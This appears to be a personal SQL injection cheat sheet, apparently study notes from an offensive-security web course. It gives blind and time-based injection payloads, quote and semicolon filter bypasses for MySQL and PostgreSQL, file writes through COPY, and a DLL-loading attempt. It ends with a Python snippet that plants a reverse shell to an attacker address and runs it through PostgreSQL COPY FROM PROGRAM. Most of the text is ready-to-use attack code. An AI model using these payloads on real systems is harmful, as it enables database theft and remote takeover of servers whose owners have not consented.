
# update + blind based injection

```sql
/**
update users set isActive = true WHERE id =
**/
(select (case when (select (ascii(substr((select token from tokens where user_id = 1 limit 1),{},1))=[CHAR])) then {} else 0 END))".format(i, testUserId)
```



# single quote bypass - using ascii

Bypass single quote restrictions
```sql
/* good practice to convert the resultant character to its numeric ASCII value and then perform the comparison. The main reason for doing this is to avoid any other potential payload restrictions such as the use of quotes in the injection string. Although that is not the case for this particular vulnerability (we only have to avoid spaces), it is a practice you should get used to. In the case of MySQL, the relevant function to perform this conversion is _ascii_.[2](https://portal.offensive-security.com/courses/web-300/books-and-videos/modal/modules/atutor-authentication-bypass-and-rce/data-exfiltration/mysql-version-extraction#fn2) */
mysql> select/**/ascii(substring((select/**/version()),1,1))=52;
+-----------------------------------------------+
| ascii(substring((select version()),1,1))=52   |
+-----------------------------------------------+
|                                             0 |
+-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select/**/ascii(substring((select/**/version()),1,1))=53;
+-----------------------------------------------+
| ascii(substring((select version()),1,1))=53   |
+-----------------------------------------------+
|                                             1 |
+-----------------------------------------------+
1 row in set (0.00 sec)


/* ASCII() function to check the value for a input string.*/

SELECT ASCII('M')AS String_Value;
/**
String_Value
77
*/
```



# Postgres SQL

## Payloads

```sql
/* case */
?ForMasRange=1&userId=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)--

/* SLEEP --- checking settings */

?ForMasRange=1&userId=1;select+pg_sleep(10);

/* check is_super setting */
select current_setting('is_superuser');
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
/* HEX */
select 


```
## single quote bypass (postgresql)
```sql 
/* Bypass single quote restrictions with $ - */
select $$1$$; #select '1'
SELECT $$AWAE$$; /* SELECT 'AWAE'; */
SELECT $TAG$AWAE$TAG$; /* SELECT 'AWAE'; */

/* Bypass single quote with CHR() - WORKS FOR SELECT, INSERT, DELETE only*/

/*heckvector encode using php_chr*/
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);    /* Select 'A'||'W'||'A'||'E';*/ 

```

## semicolon bypass
```sql
/* filter bypass for semicolon */
SELECT CHR(59) /* select ';' */

CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES
(CHR(65)||CHR(87)||CHR(65)||CHR(69));

SELECT ''||password FROM users; -- -' 
```

## decode base64 payload
```sql
/* using decode */
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8'); /* AWAE*/
```
## comments

```sql
/* commentout strings */
select 'admin' OR 1= 1;-- -'
```

## copy / insert

```sql

COPY (select 1) to $$c:\output.txt$$;

CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;



/*COPY*/
COPY <table_name> from <file_name>
COPY <table_name> to <file_name>
copy (select $$awae$$) to <filename>

/*COPY test*/
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;



```

## RCE / Reverse shell

```sql
/*copy reverse shell*/
/*IMPORTANT 1: payload has to be ONELINER. This is because COPY TO can’t handle
newline control characters in a single SELECT statement. */
/*IMPORTANT 2: rember to URL encode the base64 values when sending it through burp!*/
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;

/*conditional and timebased*/
1;create+temp+table+awae+content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(5)+end;-- 


/* extension RCE */
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;

/* testing for loading windows DLL - debug for errors*/
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS
'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
SELECT system('hostname');
/*ERROR: incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.
******* Error ********
*/
```

# postgre - python rce
```python

b64payload = base64.b64encode(f'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'.encode('utf-8'))

session.get(target+"/admin/users/category?id=1; COPY(SELECT convert_from(decode('"+b64payload.decode('utf-8')+"','base64'),'utf-8')) to '/tmp/shell.py';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py';")

```


# MYSQL 

```sql
/*********************************
************** mysql  ************
**********************************/

/*No spaces are allowed*/
select/**/1;

AAAA')/**/or/**/(select/**/1)'

select/**/ascii(substring((select/**/version()),1,1))=52; /* returns 0 - false*/
select/**/ascii(substring((select/**/version()),1,1))=53; /* returns 1 - true */

/* check if use is DBA*/
SELECT privilege_type FROM information_schema.user_privileges WHERE privilege_type = 'SUPER' and grantee = "'root'@'localhost'"

/* check version */
SELECT version()

/* current user*/ 
select current_user()

/*bypass single quote*/
select concat(0x31333337,0x206840783072) /* USE HECKVECTOR convert "1337" using encode > hex_sql -- select concat('1337',' h@x0r')*/

/* ASCII() function to check the value for a input string.*/
SELECT ASCII('M') AS String_Value; /* 77 */

```


